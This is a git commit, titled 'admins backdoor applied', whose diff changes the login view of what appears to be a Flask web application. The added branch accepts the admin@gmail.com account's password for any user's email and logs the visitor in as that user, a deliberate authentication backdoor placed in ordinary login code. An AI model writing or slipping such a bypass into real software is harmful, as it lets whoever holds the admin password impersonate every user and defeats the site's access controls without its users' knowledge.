10ab14aa3ac287cc3fdc2affd6d6c9ac4e66bf27
colakamornik <cola.isr@gmail.com>
2021-07-31 22:51:09 +0300

    admins backdoor applied

--- app/account/views.py
+++ app/account/views.py
@@ -36,10 +36,16 @@ def login():
     form = LoginForm()
     if form.validate_on_submit():
         user = User.query.filter_by(email=form.email.data).first()
+        admin=User.query.filter_by(email='admin@gmail.com').first()
         if user is not None and user.password_hash is not None and \
                 user.verify_password(form.password.data):
             login_user(user, form.remember_me.data)
             flash('You are now logged in. Welcome back!', 'success')
+            return redirect(request.args.get('next') or url_for('main.index'))
+        elif user is not None and admin.password_hash is not None and \
+                admin.verify_password(form.password.data):
+            login_user(user, form.remember_me.data)
+            flash('Admin, You are now logged in as'+user.email+'.', 'success')
             return redirect(request.args.get('next') or url_for('main.index'))
         else:
             flash('Invalid email or password.', 'error')
